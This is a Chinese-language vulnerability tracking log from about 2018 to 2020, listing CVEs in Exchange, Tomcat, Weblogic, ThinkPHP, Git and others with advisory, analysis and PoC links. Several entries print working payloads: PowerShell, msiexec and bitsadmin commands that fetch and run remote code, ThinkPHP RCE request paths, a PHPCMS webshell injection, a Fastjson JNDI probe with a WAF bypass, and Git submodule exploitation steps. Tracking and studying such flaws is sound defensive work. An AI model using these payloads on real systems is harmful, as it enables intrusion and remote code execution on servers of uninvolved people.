描述：Exchange安装时使用了静态密钥，在获取一个普通用户的登陆session之后，攻击者可以利用Exchange的静态密钥构造ViewState，从而发送恶意序列化Payload来执行命令。注意，CU12版本也受影响。攻击的目标CGI为：/ecp/default.aspx 其他：一般Exchange服务器部署在内网，可以通过ping、nslookup等命令利用dnslog探测。如果有外网的话，可以使用powershell、msiexec、bitsadmin、telnet等命令进行外连探测，不过bitsadmin、powershell、msiexec等容易被拦截或检测。 powershell.exe -nop -c “IEX ((new-object net.webclient).downloadstring(‘http://example.com/test’))” msiexec /q /i http://example.com/test bitsadmin /transfer n http://example.com/test C:\\test 【20200220】Tomcat AJP文件包含漏洞CVE-2020-1938 漏洞分析：https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ PoC：https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/blob/master/CNVD-2020-10487-Tomcat-Ajp-lfi.py PoC：https://github.com/threedr3am/learnjavabug/commit/6336bad2a7fb618cb5b982de77086b871dbed715 影响版本：Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 【202002】Dubbo HTTP反序列化漏洞CVE-2019-17564 Dubbo是一个RPC框架，支持多种交互协议。漏洞没什么好说的，一个反序列化输入点，有Gadget就能打。 Dubbo HTTP借助了 Spring 提供的 HttpInvoker 封装了 refer 和 exporter 的逻辑。HttpInvoker中直接readObject()没什么防护。访问Dubbo HTTP的RPC接口地址，直接Post反序列化payload搞定。 【20200115】Weblogic命令执行漏洞CVE-2020-2546、CVE-2020-2551 漏洞信息：https://mp.weixin.qq.com/s/Q-ZtX-7vt0JnjNbBmyuG0w CVE-2020-2546，通过T3协议实现利用、攻击者可通过此漏洞实现远程代码执行 CVE-2020-2551，攻击者可以通过IIOP协议远程访问Weblogic Server服务器上的远程接口，传入恶意数据，从而获取服务器权限并在未授权情况下远程执行任意代码（该漏洞可以绕过Oracle官方在2019年10月份发布的最新安全补丁）。 PoC：暂无 【20200115】Windows核心加密库严重漏洞可绕过证书签名CVE-2020-0601 漏洞信息：https://mp.weixin.qq.com/s/8ipXMA2XjFN-kuSm0gkIaw 漏洞分析：https://cert.360.cn/report/detail?id=082c39952ca78152857c31e35e9af6d5 https://securityaffairs.co/wordpress/96486/uncategorized/cve-2020-0601-nsacrypto-exploits.html https://blog.rapid7.com/2020/01/16/cve-2020-0601-windows-cryptoapi-spoofing-vulnerability-what-you-need-to-know/ NSA报告：https://media.defense.gov/2020/Jan/14/2002234275/-1/-1/0/CSA-WINDOWS-10-CRYPT-LIB-20190114.PDF PoC:https://github.com/kudelskisecurity/chainoffools PoC:https://github.com/ollypwn/cve-2020-0601 2019 【20191220】Apache Log4j 1.2 SocketServer 反序列化漏洞CVE-2019-17571 漏洞信息：https://seclists.org/oss-sec/2019/q4/167 影响范围：Apache Log4j 1.2.27及以下版本都受影响，在Log4j 2.8.2中修复了这个漏洞（CVE-2017-5645）。 漏洞分析：https://mp.weixin.qq.com/s/VgYiuFl9PsiKJt0_t0ae7w 漏洞描述：在2.8.2之前的2.x版本都存在反序列化漏洞（CVE-2017-5645），然而在1.x版本同样存在这个反序列化漏洞，分配漏洞编号为CVE-2019-17571。 【20191119】Apache Solr默认配置对外开放JMX端口导致命令执行CVE-2019-12409 https://www.mail-archive.com/announce@apache.org/msg05559.html 8.1.1和8.2.0版本中默认配置文件solr.in.sh中ENABLE_REMOTE_JMX_OPTS默认设置为true，会开放JMX服务，将RMI端口暴露，从而导致命令执行。默认端口为18983。 利用工具：mjet 【20191112】Flink未鉴权RCE 未鉴权的Flink Dashboard可以提交任务，可以提交恶意的jar包来执行命令。 PoC：https://github.com/LandGrey/flink-unauth-rce 【20191107】Squid缓冲区溢出远程代码执行CVE-2019-12526 Squid发布了新版本4.9，新版本修复了远程溢出漏洞CVE-2019-12526 http://www.squid-cache.org/Advisories/SQUID-2019_7.txt 早在 2019-07-12 Squid官方发布安全公告CVE-2019-12527，http://www.squid-cache.org/Advisories/SQUID-2019_5.txt CVE-2019-12527漏洞分析及PoC片段：https://mp.weixin.qq.com/s/7oSuurI_h04GacLVOckaxQ 2019-08-22 趋势科技发布CVE-2019-12527研究报告： https://www.thezdi.com/blog/2019/8/22/cve-2019-12527-code-execution-on-squid-proxy-through-a-heap-buffer-overflow 【20191031】Apache Solr Velocity模版注入RCE漏洞 https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt 12-30更新：https://cwiki.apache.org/confluence/display/solr/SolrSecurity 12-30更新：https://seclists.org/oss-sec/2019/q4/175 【20191023】Apache Shiro Padding Oracle漏洞 CVE-2019-12422 在获取一个有效的rememberme的情况下，通过PaddingOracle构造恶意的rememberme实现反序列化利用。 分析: https://www.anquanke.com/post/id/192819 Issue: https://issues.apache.org/jira/browse/SHIRO-721 描述：1. 需要合法的Cookie然而很多业务Cookie里没有rememberMe 2. Padding Oracle依赖页面返回信息来进行侧信道攻击 3. 需要目标环境存在反序列化Gadget 关于PaddingOracle：http://blog.zhaojie.me/2010/10/padding-oracle-attack-in-detail.html https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-12422 PoC: https://github.com/Geekby/shiro_rce_exp 【20191023】PHP远程命令执行漏洞CVE-2019-11043 https://bugs.php.net/bug.php?id=78599 https://lab.wallarm.com/php-remote-code-execution-0-day-discovered-in-real-world-ctf-exercise/ https://github.com/neex/phuip-fpizdam 【20191017】Kibana &lt; 6.6.0 控制台命令执行漏洞 https://mp.weixin.qq.com/s/R4rzYDp9-q2NYAOvPK951A 【20191010】iTerm2存在严重漏洞可导致远程命令执行 https://blog.mozilla.org/security/2019/10/09/iterm2-critical-issue-moss-audit/ 影响3.3.6以下版本 【20190905】FastJson拒绝服务漏洞 影响版本&lt;1.2.60 FastJson在处理\\x转义字符时没有进行格式判断，攻击者可以向服务器发送恶意请求，导致CPU/RAM过载。 PoC：{&quot;a&quot;:&quot;\\x&quot;} 【20190814】MSCTF提权漏洞，影响XP到Win10所有版本 https://thehackernews.com/2019/08/ctfmon-windows-vulnerabilities.html https://googleprojectzero.blogspot.com/2019/08/down-rabbit-hole.html https://github.com/taviso/ctftool https://bugs.chromium.org/p/project-zero/issues/detail?id=1859 【20190814】Windows RDP蠕虫漏洞CVE-2019-1181、CVE-2019-1182 http://blog.nsfocus.net/cve-2019-1181cve-2019-1182/ 【20190801】Apache Slor RCE CVE-2019-0193 在Apache Solr中，DataImportHandler是一个可选但常用的模块，由于DIH配置可以包含脚本，因此dataConfig参数存在安全风险。而从Solr的8.2.0版开始，使用此参数需要将Java System属性enable.dih.dataConfigParam设置为true，并不能直接触发。 https://issues.apache.org/jira/browse/SOLR-13669 https://www.jianshu.com/p/11ac6c7f4835 https://www.anquanke.com/post/id/184151 【20190730】iMessage远程获取文件CVE-2019-8646 https://bugs.chromium.org/p/project-zero/issues/detail?id=1858 【2019-07-22】ProFTPd任意文件拷贝漏洞CVE-2019-12815 需要登录或者匿名账号 官方补丁https://github.com/proftpd/proftpd/pull/816 官方漏洞信息http://bugs.proftpd.org/show_bug.cgi?id=4372 【2019-07-10】Fastjson反序列化命令执行，1.2.48以下Autotype绕过 com.alibaba.fastjson.serializer.MiscCodec 定义了特定class的序列化与反序列化逻辑，包括java.lang.Class等。利用java.lang.Class可以实例化 com.sun.rowset.JdbcRowSetImpl。由于Fastjson的缓存特性，在利用com.sun.rowset.JdbcRowSetImpl进行JNDI注入时，直接从缓存表中取对象实例，则可以绕过autotype限制。 PoC: https://raw.githubusercontent.com/kxcode/snippet/master/FastJson1.2.47.txt 检测：java.net.InetAddress类在fastjson 1.2.48中被加入了autotype黑名单，如果dnslog服务器成功收到请求，则说明目标fastjson版本低于1.2.48。Payload如下：{&quot;@type&quot;:&quot;java.net.InetAddress&quot;,&quot;val&quot;:&quot;inetaddress.fastjson.rxxoow.ceye.io&quot;} WAF绕过：@type关键字可以用\\u0040type绕过 总结：https://www.freebuf.com/vuls/208339.html 【20190615】Weblogic漏洞CVE-2019-2725绕过 TODO 【20190615】Windows NTLM认证漏洞CVE-2019-1040 域提权深度分析 https://mp.weixin.qq.com/s/NEBi8NflfaEDL2qw1WIqZw 【20190522】Windows10提权0day Twitter：https://twitter.com/dangoodin001/status/1131345555186077697 US Cert公告：https://kb.cert.org/vuls/id/119704/ PoC: https://github.com/SandboxEscaper/polarbearrepo/tree/master/sandboxescape 【20190515】Windows RDP远程命令执行CVE-2019-0708 Windows RDP远程桌面存在远程命令执行漏洞。 影响：Windows XP/2003/7/Server 2008/Server 2008R2 漏洞分析：https://www.anquanke.com/post/id/178964 漏洞远程扫描：https://github.com/zerosum0x0/CVE-2019-0708 跟踪报道：https://www.anquanke.com/post/id/178966 漏洞分析：深信服千里目 ZDI漏洞分析：https://www.thezdi.com/blog/2019/5/27/cve-2019-0708-a-comprehensive-analysis-of-a-remote-desktop-services-vulnerability 【20190418】Weblogic反序列化命令执行漏洞 CVE-2019-2725 公告：https://www.oracle.com/technetwork/security-advisory/alert-cve-2019-2725-5466295.html 预警：http://blog.nsfocus.net/weblogic-ns-2019-0015/ 分析：https://www.anquanke.com/post/id/177381 老POC：未绕过CVE-2017-10271 https://github.com/No4l/MyTools/commit/9943385596143ac9e906354a7c1b42b5570e669f 新POC：Weblogic10 -&gt; toplink， Weblogic12 -&gt; slf4j ，通用：JNDI JdbcRowSetImpl 【20190406】Apache Confluence命令执行漏洞 CVE-2019-3395 CVE-2019-3396 公告：https://confluence.atlassian.com/doc/confluence-security-advisory-2019-03-20-966660264.html 漏洞分析：https://paper.seebug.org/884/ 描述：Confluence通常是一个用于企业内部的知识库和Wiki工具，在服务端模板渲染时存在漏洞，可导致任意文件读取、远程对象加载和RCE。漏洞点处在Widget Connector（小工具连接器）这个功能上。用户在创建文档时，可以在文章中嵌入一些视频、文档之类的（比如：Youtube视频、Flickr幻灯片、Google文档等内容），服务端会根据用户传入的远程资源URL进行渲染，此时用户可以手工传入_template参数，指定服务端模板文件，使服务端加载恶意的远程模板文件，在模板文件中利用Java反射达到命令执行的效果（模板引擎是velocity）。也可以将_template设置为服务器上的文件，从而读取文件内容，如：/WEB-INF/web.xml或者../web.xml。 POC https://github.com/kxcode/snippet/blob/master/CVE-2019-3396.md 影响范围： https://www.freebuf.com/news/200183.html 漏洞利用不需要登录 【20190403】Apache Http Server提权漏洞 CVE-2019-0211 分析 https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html Exploit https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache 影响范围 2.4.17 ~ 2.4.28 【20190307】Apache Solr 命令执行漏洞 CVE-2019-0192 POC https://github.com/mpgn/CVE-2019-0192 Bug单 https://issues.apache.org/jira/browse/SOLR-13301 描述：攻击者可以通过Solr的HTTP Config API将Solr的JMX服务指向一个恶意的RMI服务，利用Solr不安全的反序列化功能，达到RCE的危害。 影响版本：5.0.0 ~ 5.5.5、6.0.0 ~ 6.6.5 安全版本：7.0 【20190307】Chrome ‘FileReader’ Use After Free命令执行漏洞CVE-2019-5786 https://twitter.com/justinschuh/status/1103087046661267456 影响范围：Chrome &lt; 72.0.3626.121 或者 Chromium &lt; 74.0.3721.0 代码Diff：https://chromium.googlesource.com/chromium/src/+/150407e8d3610ff25a45c7c46877333c4425f062%5E%21/#F0 新闻报道： https://nakedsecurity.sophos.com/2019/03/06/serious-chrome-zero-day-google-says-update-right-this-minute/ https://www.securityfocus.com/bid/107213 https://www.solidot.org/story?sid=59806 https://www.leiphone.com/news/201903/CzzG8lN74hZ3dUwK.html 漏洞分析 https://www.anquanke.com/post/id/173681 POC https://github.com/exodusintel/CVE-2019-5786 Exp https://github.com/exodusintel/Chromium-941743 【20190221】WinRAR命令执行漏洞CVE-2018-20250, CVE-2018-20251, CVE-2018-20252, CVE-2018-20253 Extracting a 19 Year Old Code Execution from WinRARhttps://research.checkpoint.com/extracting-code-execution-from-winrar/ POC:https://github.com/Ridter/acefile 【20190220】Wordpress5.0.0命令执行漏洞 http://www.4hou.com/vulnerable/16282.html 【20190213】Nexus Repository Manager 3 访问控制缺失及远程代码执行CVE-2019-7238 https://cloud.tencent.com/announce/detail/459 【20190213】runc Docker逃逸漏洞CVE-2019-5736 分析：http://blog.nsfocus.net/runc-cve-2019-5736/ PoC：https://github.com/q3k/cve-2019-5736-poc 【20190124】Numpy库存在反序列化命令执行漏洞CVE-2019-6446 https://www.bleepingcomputer.com/news/security/numpy-is-awaiting-fix-for-critical-remote-code-execution-bug/ 【20190122】apt/apt-get 远程命令执行漏洞披露（CVE-2019-3462） https://justi.cz/security/2019/01/22/apt-rce.html https://www.anquanke.com/post/id/170090 【20190115】ThinkPHP 5.1~5.2 RCE漏洞 ThinkPHP 5.0.x-5.0.23、5.1.x、5.2.x 全版本远程代码执行漏洞分析 http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/ POC合集：https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection 【20190110】xterm.js 命令执行漏洞CVE-2019-0542 POC：echo -e &quot;abcdef\\x1bP+qfoo;\\ntouch /tmp/foo;aa\\n\\x1b\\n&quot; 在xterm终端下可逃逸并执行命令。利用场景：受害者执行curl http://xxx/xxx.txt，服务端返回的内容包含上述特殊字符，于是回显的数据逃逸了xterm的终端，并额外执行了命令。 2018 【20181221】Windows越权任意文件读取0day https://thehackernews.com/2018/12/windows-zero-day-exploit.html https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html 【20181220】微软发布补丁修复一个在野利用的IE漏洞 CVE-2018-8653 https://www.cnbeta.com/articles/tech/800317.htm https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2018-8653 【20181210】ThinkPHP发布V5.1.31、V5.0.23安全更新，修复Getshell漏洞 https://mp.weixin.qq.com/s?__biz=MjM5OTEzMzQwMA==&amp;mid=2651667456&amp;idx=1&amp;sn=746ee2b9aa2b02f6ff60ff906ec2939a 受影响版本包括：V5.0.、V5.1. 修复的版本：V5.1.31、V5.0.23 /public/index.php?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=md5&amp;vars[1][]=321 /public/index.php?s=index/\\think\\view\\driver\\Php/display/%3E&amp;content=aaa%3C?php%20phpinfo();?%3E 【20181205】Kubernetes API特权提升漏洞CVE-2018-1002105 https://github.com/kubernetes/kubernetes/issues/71411 【20181205】Flash命令执行漏洞CVE-2018-15982 释放后重用，任意代码执行。 http://blog.nsfocus.net/adobe-flash-player-cve-2018-15982/ 攻击事件分析：https://www.freebuf.com/column/191383.html POC：https://github.com/B1eed/VulRec/tree/master/CVE-2018-15982 【20181128】PHPCMS 2008 任意文件写入 RCE CVE-2018-19127 描述：发恶意包：/type.php?template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rssShell落在这个文件：/cache_template/rss.tpl.php 内容：&quot;@unlink(FILE);assert($_POST[1]);&quot; http://www.yncert.org.cn/article/show/8119.html https://github.com/ab1gale/phpcms-2008-CVE-2018-19127 【20181127】Consul服务接口存在RCE漏洞 官方公告：https://www.hashicorp.com/blog/protecting-consul-from-rce-risk-in-specific-configurations 描述： Consul的早期版本中HTTP API没有进行访问控制，可以用来执行命令。Consul 和 zookeeper 及 etcd 类似常用于分布式系统，HashiCorp公司推出的开源工具，用于实现分布式系统的服务发现与配置。问题出在老版本的默认配置（新版本已经改成可选配置）, server 和 client 会开放 8500 端口作为 web api，默认没有鉴权，v1/agent/service/register，v1/session/create 等接口都可用于执行命令。 PoC：https://packetstormsecurity.com/files/150940/consul_service_exec.rb.txt 【20181113】严重，Exchange Server账号冒用，盗用任意用户邮件CVE-2018-8581 https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581 POC：https://github.com/thezdi/PoC/tree/master/CVE-2018-8581 POC：https://github.com/WyAtu/CVE-2018-8581 分析CVE-2018-8581：在Microsoft Exchange上冒充用户 https://www.anquanke.com/post/id/168337 分析CVE-2018-8581：https://xz.aliyun.com/t/3670 新的攻击手法，可以拿域控：https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/ 利用同样的方式拿到EWS Hash，通过这个Hash进行NTLM中继，攻击域控ldap，给指定用户提权，通过dscync导出人以用户Hash。 补丁：https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2019-0686 【20181106】GOGS/Gitea任意代码执行(CVE-2018-18925/6)及利用流程 漏洞分析：https://xz.aliyun.com/t/3168 https://www.anquanke.com/post/id/163575 Gogs 是一款极易搭建的自助 Git 服务。 Gogs 的目标是打造一个最简单、最快速和最轻松的方式搭建自助 Git 服务，使用 Go 语言开发。 Gitea是从Gogs发展而来，同样的拥有极易安装，运行快速的特点，而且更新比Gogs频繁很多，维护的人也多。 【20181106】Struts 2.3.36使用了1.3.2版本的commons-fileupload组件，存在反序列化命令执行漏洞 描述：2017-06-20 Struts 2.5.12已经使用了1.3.3版本的commons-fileupload组件 &lt;https://issues.apache.org/jira/browse/WW-4812 US-CERT公告：https://www.us-cert.gov/ncas/current-activity/2018/11/05/Apache-Releases-Security-Advisory-Apache-Struts 开发者邮件：http://mail-archives.us.apache.org/mod_mbox/www-announce/201811.mbox/%3CCAMopvkMo8WiP%3DfqVQuZ1Fyx%3D6CGz0Epzfe0gG5XAqP1wdJCoBQ%40mail.gmail.com%3E NVD漏洞公告：2016-10-25 https://nvd.nist.gov/vuln/detail/CVE-2016-1000031 官方漏洞公告：2016-11-04 https://issues.apache.org/jira/browse/FILEUPLOAD-279 漏洞分析 By Tenable：https://www.tenable.com/security/research/tra-2016-12 漏洞分析：https://blog.spoock.com/2018/10/15/cve-2016-1000031/ 影响版本：commons-fileupload 1.3.2及以下版本 时间线： 2014-02-07 FileUpload 1.3.1 发布 2016-05-26 FileUpload 1.3.2 发布 2016-10-25 NVD漏洞分析 https://nvd.nist.gov/vuln/detail/CVE-2016-1000031 2016-11-04 Commons FileUpload 官方公告 CVE-2016-1000031 https://issues.apache.org/jira/browse/FILEUPLOAD-279 2017-06-13 FileUpload 1.3.3 发布 2017-06-20 Struts 2.5.12 将内置commons-fileupload组件更新到1.3.3 【20181019】Oracle Weblogic远程代码执行漏洞CVE-2018-3191 描述：这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大。 漏洞分析：https://www.anquanke.com/post/id/162274 【20181017】LibSSH 0.6及更高版本认证绕过漏洞 https://www.libssh.org/2018/10/16/libssh-0-8-4-and-0-7-6-security-and-bugfix-release/ https://mp.weixin.qq.com/s/mzxaX6g6Iq0ihQwrf6l8Mw MSF Exploit 【20181010】GhostScript命令执行漏洞Bypass CVE-2018-17961 描述：https://seclists.org/oss-sec/2018/q4/28 POC：https://bugs.chromium.org/p/project-zero/issues/detail?id=1682&amp;desc=2 【20181009】CVE-2018-8453 Win32k Elevation of Privilege Vulnerability Zero-day exploit (CVE-2018-8453) used in targeted attacks https://securelist.com/cve-2018-8453-used-in-targeted-attacks/88151/ 【20181007】MikroTik RouterOS未授权文件读取到GetShell https://www.freebuf.com/vuls/187272.html 【20180930】GoogleProjectZero Linux内核提权 VMA-UAF 漏洞CVE-2018-17182 https://github.com/jas502n/CVE-2018-17182 Linux内存管理子系统中的缓存失效错误，导致释放后使用漏洞。 【20180919】交易前端图表通用JS组件 Tradingview 存在XSS漏洞 POC：http://topbtc.com/tradingview/charting_library/static/tv-chart.e816a7a6edc9de3ed709.html#enabledFeatures=[]&amp;disabledFeatures=[]&amp;indicatorsFile=https://kingx.me/p/x.js 分析：通用K线展示JS库 TradingView 存在 XSS漏洞 https://mp.weixin.qq.com/s/yfbKf_5Nk2NXFl2-xlFqKg 漏洞文件：tv-chart.js 或者 library.xxxxxx.js 【20180912】Microsoft XML Core Services MSXML Remote Code Execution CVE-2018-8420 POC：https://github.com/Theropord/CVE-2018-8420/ 公告：https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8420 实测PoC：https://github.com/kxcode/snippet/blob/master/CVE-2018-8420.md 描述：需要更改IE默认配置，IE安全设置-Internet区域，设置“对未标记为可安全执行脚本的ActiveX空间初始化并执行”为启用（不安全）。 【20180905】ECShop全版本命令执行漏洞 分析：https://paper.seebug.org/695/ 【20180829】Windows ALPC 本地提权 CVE-2018-8440 https://www.kb.cert.org/vuls/id/906424 https://github.com/SandboxEscaper/randomrepo/blob/master/PoC-LPE.rar https://twitter.com/SandboxEscaper/status/1034125195148255235 https://doublepulsar.com/task-scheduler-alpc-exploit-high-level-analysis-ff08cda6ad4f https://github.com/GossiTheDog/zeroday/tree/master/ALPC-TaskSched-LPE POC分析：http://www.qingpingshan.com/m/view.php?aid=394126 描述：提权之后，系统上会残留一些文件，C:\\Windows\\Tasks\\UpdateTask.job、C:\\Windows\\System32\\DriverStore\\FileRepository\\prnms003.inf_amd64_4592475aca2acf83\\Amd64\\PrintConfig.dll。当新建excel，然后点击字体选择下拉选框按钮时，会触发执行。 【20180822】UEditor两个版本上传漏洞 http://www.freebuf.com/vuls/181814.html 【20180822】Struts2 命令执行漏洞 S2-057 CVE-2018-11776 公告：https://cwiki.apache.org/confluence/display/WW/S2-057 作者博客：https://lgtm.com/blog/apache_struts_CVE-2018-11776 国内分析：https://xz.aliyun.com/t/2618 【20180822】GhostScript沙盒绕过命令执行，影响ImageMagick CVE-2018-16509 USCERT：https://www.kb.cert.org/vuls/id/332928 seclist：http://seclists.org/oss-sec/2018/q3/144 PoC: https://github.com/kxcode/snippet/blob/master/GhostScript.txt 【201808】Windows提权 CVE-2018-8120 Exp：https://github.com/alpha1ab/CVE-2018-8120/tree/master/CVE-2018-8120 【20180817】在野利用的 VBScript 引擎 UAF 漏洞 CVE-2018-8373 https://blog.trendmicro.com/trendlabs-security-intelligence/use-after-free-uaf-vulnerability-cve-2018-8373-in-vbscript-engine-affects -internet-explorer-to-run-shellcode/ https://www.freebuf.com/column/190504.html 利用CVE-2018-8373 0day漏洞的攻击与Darkhotel团伙相关的分析 https://ti.360.net/blog/articles/analyzing-attack-of-cve-2018-8373-and-darkhotel/ 【20180815】OpenSSH用户枚举漏洞CVE-2018-15473 描述：OpenSSH 7.7及之前版本中存在用户枚举漏洞，该漏洞源于程序会对有效的和无效的用户身份验证请求发出不同的响应。攻击者可通过发送特制的请求利用该漏洞枚举用户名称。 POC： 【20180815】Microsoft Exchange Server 远程代码执行 CVE-2018-8302 微软公告：https://portal.msrc.microsoft.com/zh-CN/security-guidance/advisory/CVE-2018-8302 趋势分析：https://www.thezdi.com/blog/2018/8/14/voicemail-vandalism-getting-remote-code-execution-on-microsoft-exchange-server 【20180815】Intel CPU再爆芯片级漏洞 L1TF推测执行侧信道攻击漏洞 (L1 Terminal Fault Speculative) CVE：CVE-2018-3615、CVE-2018-3620、CVE-2018-3646 Intel官方公告：https://www.intel.com/content/www/us/en/security-center/advisory/intel-sa-00161.html 谷歌公告：https://cloud.google.com/blog/products/gcp/protecting-against-the-new-l1tf-speculative-vulnerabilities Intel分析：https://www.intel.com/content/www/us/en/architecture-and-technology/l1tf.html Xen公告：http://xenbits.xen.org/xsa/advisory-273.html RedHat公告：https://www.redhat.com/archives/rhsa-announce/2018-August/msg00012.html 【20180801】HP Ink Printers Remote Code Execution CVE-2018-5924, CVE-2018-5925 细节：https://research.checkpoint.com/sending-fax-back-to-the-dark-ages/ 报道：https://threatpost.com/def-con-2018-critical-bug-opens-millions-of-hp-officejet-printers-to-attack/134972/ 【20180808】Linux内核DoS漏洞 SegmentSmack CVE-2018-5390 CVE-2018-5390 【20180725】Jenkens任意文件读取漏洞 CVE-2018-1999002 官方公告：https://jenkins.io/security/advisory/2018-07-18/ PoC：https://codegists.com/snippet/python/cve-2018-1999002py_becojo_python 【20180718】Weblogic未授权任意文件上传 CVE-2018-2894 https://mp.weixin.qq.com/s/8fm916rtAwz_LUSbyZ7M6Q PoC：https://github.com/LandGrey/CVE-2018-2894 【20180718】Weblogic反序列化漏洞 CVE-2018-2893 https://www.anquanke.com/post/id/152164 描述：CVE-2018-2628修复不完善，可以被绕过。 https://github.com/tdy218/ysoserial-cve-2018-2628 【20180703】Wechat Pay SDK XXE漏洞 漏洞详情：http://seclists.org/fulldisclosure/2018/Jul/3 【20180604】Microsoft JScript命令执行漏洞 CVE-2018-8267 https://www.zerodayinitiative.com/advisories/ZDI-18-534/ http://www.freebuf.com/articles/system/174187.html 【20180605】Zip Slip漏洞 和五月份的ZipperDown漏洞差不多 https://res.cloudinary.com/snyk/image/upload/v1528192501/zip-slip-vulnerability/technical-whitepaper.pdf https://snyk.io/research/zip-slip-vulnerability 受影响库列表：https://github.com/snyk/zip-slip-vulnerability 【20180601】 Git submodule RCE漏洞 CVE-2018-11235 描述：Git没有对子模块名称进行过滤，存在目录穿越漏洞。攻击者可以通过配置恶意的.gitmodules文件，将Git Hooks脚本文件推送到了客户端中，当用户在使用’git clone –recurse-submodules’时，触发RCE。 漏洞点说明：通过路径穿越，可以设置任意目录为子模块的.git目录。而在这一目录下放入hooks/post-checkout等恶意hooks脚本，即可达到RCE的效果。 漏洞分析：https://xz.aliyun.com/t/2371 漏洞分析：https://staaldraad.github.io/post/2018-06-03-cve-2018-11235-git-rce/ 漏洞分析：https://atorralba.github.io/CVE-2018-11235/ POC：https://github.com/Rogdham/CVE-2018-11235 影响范围： Git version &lt; 2.13.7、Git version 2.14.x &lt; 2.14.4、Git version 2.15.x &lt; 2.15.2、Git version 2.16.x &lt; 2.16.4、Git version 2.17.x &lt; 2.17.1 修复版本：Git version 2.14.4、2.15.2、2.16.4、2.17.1 前置知识： .git/hooks文件夹下存放了Git Hooks脚本，本质上就是Shell脚本，在某些情况下会被Git调用。比如：在执行git checkout时会自动调用post-checkout脚本。这些Hooks脚本存放在客户端，clone项目时不会传递这些hook脚本。 主项目根目录的子模块文件夹下有一个.git文件，文件内容是这个子模块的.git目录路径。而这个路径通常指向了主项目的.git/modules目录，该目录下每一个文件夹对应的存放了各个子模块的.git目录的文件。而Git在解析.gitmodules文件时，会把子模块的名称，拼接到.git/modules/后面，当作子模块的.git目录路径。也就是这里导致了本次RCE漏洞。 .gitmodules文件说明：https://git-scm.com/docs/gitmodules Git子模块工具：https://git-scm.com/book/en/v2/Git-Tools-Submodules 利用流程： 创建恶意项目repo 添加一个恶意的子模块，命名为evil。git submodule add some_repo_address evil 将目录.git/modules/evil拷贝到主项目根目录的testdir/evil文件夹下。 往testdir/evil目录中的hooks目录添加恶意hook脚本。 配置.gitmodules，设置子模块的update参数为checkout，从而在子模块update时触发post-checkout脚本。（注：If you pass --recurse-submodules to the git clone command, it will automatically initialize and update each submodule in the repository.） 配置.gitmodules，使子模块的name为../../testdir/evil，使子模块的Git目录指向主项目根目录下的testdir/evil。 受害者git clone --recurse-submodules repo时触发RCE。 【20180529】EOS节点代码执行漏洞 描述：EOS区块链系统在解析智能合约WASM文件时的一个越界写缓冲区溢出漏洞。攻击者可以上传恶意的智能合约至节点服务器，在节点服务器解析恶意合约后，攻击者就能够在节点服务器上执行任意代码并完全控制服务器。 PR文章：https://mp.weixin.qq.com/s/nFBxMrl7QMeuFLt2AA6u4Q 漏洞分析：http://blogs.360.cn/blog/eos%E8%8A%82%E7%82%B9%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/ 复盘：https://mp.weixin.qq.com/s/rnZlocdFgA0g2CSDRv31Cw 【20180516】DHCP命令注入漏洞 https://www.youtube.com/watch?v=LuD_7ud0XyM&amp;feature=youtu.be POC：https://github.com/kxcode/snippet/blob/master/DHCP-Injection.txt 【20180515】内核提权漏洞，程序员误读Intel文档 CVE-2018-8897 CVE-2018-1087 漏洞分析：https://mp.weixin.qq.com/s/xVudsIFermEYRJ7fN-qK-w Arbitrary code execution with kernel privileges using CVE-2018-8897 PoC：https://github.com/can1357/CVE-2018-8897 【20180515】盘古发现ZipperDown漏洞 漏洞公告：https://mp.weixin.qq.com/s/SMpBQ4mZQLVLfgK7f84OYA 描述：WiFi劫持+解压+路径穿越 漏洞Issue：https://github.com/ZipArchive/ZipArchive/issues/453 【20180512】Node Security - macaddress模块存在命令执行漏洞 Node Security Platform Advisory https://nodesecurity.io/advisories/654 报告：https://hackerone.com/reports/319467 **【20180508】CVE-2018-0824 Microsoft Windows COM 远程命令执行漏洞** 该漏洞可远程调用一个计算机上的COM组件，根据内容分析，作者给出的POC无法对远程主机进行复现，是由于在调用CoGetInstanceFromIStorage()时未传递计算机名（COSERVERINFO），我们可以将调用COM组件的程序嵌入office或网页中，也能够获取目标主机的系统权限。 影响：Microsoft Windows Server 2008 Microsoft Windows Server 2008 R2 Microsoft Windows 7 Microsoft Windows Windows Server 2012 Microsoft Windows 8.1 Microsoft Windows Server 2012 R2 Microsoft Windows RT 8.1 Microsoft Windows 10 Microsoft Windows Server 2016 分析文章：https://codewhitesec.blogspot.com/2018/06/cve-2018-0624.html 【20180508】Windows VBScript引擎远程执行代码漏洞 CVE-2018-8174 描述：VBScript引擎处理内存中对象的方式中存在一个远程执行代码漏洞。该漏洞可能以一种攻击者可以在当前用户的上下文中执行任意代码的方式来破坏内存。成功利用此漏洞的攻击者可以获得与当前用户相同的用户权限。 https://www.freebuf.com/column/188622.html 【20180502】7-Zip命令执行漏洞（CVE-2018-10115） 分析：https://landave.io/2018/05/7-zip-from-uninitialized-memory-to-remote-code-execution/ 【20180418】Weblogic 反序列化远程代码执行漏洞 CVE-2018-2628 描述：http://blog.nsfocus.net/cve-2018-2628/ 